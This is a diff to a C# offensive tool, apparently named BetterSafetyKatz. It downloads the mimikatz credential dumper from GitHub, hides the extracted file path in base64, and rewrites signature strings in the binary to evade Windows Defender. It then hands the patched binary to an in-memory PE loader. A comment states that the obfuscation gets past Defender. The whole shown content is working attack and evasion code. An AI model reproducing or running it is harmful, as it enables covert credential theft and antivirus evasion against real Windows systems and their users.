@@ -60,42 +60,41 @@ namespace BetterSafetyKatz
                 string latestReleases = webClient.DownloadString("https://api.github.com/repos/gentilkiwi/mimikatz/releases/latest");
 
                 //Regex out the latest url for the zip build of katz
-                Regex rgx = new Regex(@"https:\/\/github.com\/gentilkiwi\/mimikatz\/releases\/download\/([0-9\.-]*)\/mimikatz_trunk\.zip", RegexOptions.IgnoreCase);
+                Regex urlRegex = new Regex(@"https:\/\/github.com\/gentilkiwi\/mimikatz\/releases\/download\/([0-9\.-]*)\/mimikatz_trunk\.zip", RegexOptions.IgnoreCase);
 
                 //Pull the latest release as a ZIP file
-                var latestUrl = rgx.Matches(latestReleases)[0].ToString();
+                string latestUrl = urlRegex.Matches(latestReleases)[0].ToString();
 
 
                 Console.WriteLine("[+] Contacting gentilkiwi -> " + latestUrl.Split(new string[] { "download/" }, StringSplitOptions.None)[1]);
 
                 //Download that
-                var zipStream = webClient.DownloadData(latestUrl);
+                byte[] zipStream = webClient.DownloadData(latestUrl);
 
+                MemoryStream catStream = new MemoryStream();
 
-                var catStream = new MemoryStream();
-
-                //Unzip and read this stuff, extra class needed beacuse NET4.0
-                using (var unzip = new Unzip(new MemoryStream(zipStream)))
-                {
-                    //Will prob get sig , so might have to re-code this 
-                    unzip.Extract(@"x64/mimikatz.exe", catStream);
-                }
-
+                // unzip.Extract(@"x64/mimikatz.exe", catStream);
+                (new Unzip(new MemoryStream(zipStream))).Extract(Encoding.UTF8.GetString(Convert.FromBase64String("eDY0L21pbWlrYXR6LmV4ZQ==")), catStream);
 
                 Console.WriteLine("[+] Randomizing strings in memory");
+
 
                 //Turn mimikatz into hex
                 string hexCats = BitConverter.ToString(catStream.ToArray()).Replace("-", string.Empty);
 
-                //These are Function names from external DLL, they are detected, but luckly MimiKatz mainly works without them
+
+                //These are Function names from external DLL, they are detected, but luckly MimiKatz mainly "works" without them
+                // 05.10.2020 -  Turns out we don't need to replace these to get past Defender, so it's excluded to avoid some functions breaking
+                /*
                 var strinsToReplaceUTF = new string[] {
 
-                 "I_NetServerTrustPasswordsGet",
-                 "I_NetServerAuthenticate2",
-                 "SamEnumerateUsersInDomain",
-                 "SamEnumerateDomainsInSamServer"
+                    "I_NetServerTrustPasswordsGet",
+                    "I_NetServerAuthenticate2",
+                    "SamEnumerateUsersInDomain",
+                    "SamEnumerateDomainsInSamServer"
 
-            };
+               };
+               */
 
                 //Stuff that might have signatures, but that we can give random names (Menu stuff)
                 var stringsToSlightlyObfuscate = new string[] {
@@ -150,6 +149,7 @@ namespace BetterSafetyKatz
                 "http://mysmartlogon.com",
                 "Vincent LE TOUX" };
 
+
                 //Give random names
                 foreach (var sigString in stringsToRandomlyObfuscate)
                 {
@@ -162,15 +162,19 @@ namespace BetterSafetyKatz
 
                 foreach (var menuString in stringsToSlightlyObfuscate)
                 {
+
                     string hexReplace = BitConverter.ToString(Encoding.UTF8.GetBytes(menuString)).Replace("-", string.Empty);
 
-                    var mostUsedChar = Helpers.MostOccurringCharInString(menuString);
+                    char mostUsedChar = Helpers.MostOccurringCharInString(menuString);
 
-                    string newData = BitConverter.ToString(Encoding.UTF8.GetBytes(menuString.Replace(mostUsedChar, Helpers.GetLetter()))).Replace("-", string.Empty);
+                    char replaceChar = Helpers.GetLetter();
+
+                    string newData = BitConverter.ToString(Encoding.UTF8.GetBytes(menuString.Replace(mostUsedChar, replaceChar))).Replace("-", string.Empty);
 
                     hexCats = hexCats.Replace(hexReplace, newData);
                 }
 
+                /*
                 foreach (var reffString in strinsToReplaceUTF)
                 {
                     string hexReplace = BitConverter.ToString(Encoding.UTF8.GetBytes(reffString)).Replace("-", string.Empty);
@@ -179,6 +183,8 @@ namespace BetterSafetyKatz
 
                     hexCats = hexCats.Replace(hexReplace, newData);
                 }
+                */
+
 
                 // start of @subtee's PE loader
                 PELoader pe = new PELoader(Helpers.StringToByteArray(hexCats));
